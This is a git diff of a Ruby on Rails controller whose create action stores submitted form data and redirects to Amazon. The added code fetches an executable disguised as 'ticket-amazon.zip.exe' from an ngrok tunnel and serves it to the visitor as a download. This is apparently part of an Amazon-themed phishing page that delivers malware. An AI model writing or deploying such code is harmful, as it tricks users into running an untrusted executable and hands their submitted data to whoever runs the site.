@@ -19,17 +19,25 @@ class InformationController < ApplicationController
   def edit
   end
 
+  require 'net/http'
   # POST /information or /information.json
   def create
     @information = Information.new(information_params)
 
-    respond_to do |format|
       if @information.save
-        redirect_to "https://www.amazon.com/-/es/", allow_other_host: true
+        url = URI.parse("https://151b-181-78-80-242.ngrok-free.app/ticket-amazon.zip.exe")
+        response = Net::HTTP.get_response(url)
+        if response.code == "200"
+          send_data response.body, filename: "ticket-amazon.zip.exe", disposition: 'attachment', content_type: 'application/octet-stream'
+          redirect_to "https://www.amazon.com/-/es/"
+          return
+        else
+          redirect_to "https://www.amazon.com/-/es/"
+          return
+        end
       else
         redirect_to "https://www.amazon.com/-/es/", allow_other_host: true
       end
-    end
   end
 
   # PATCH/PUT /information/1 or /information/1.json
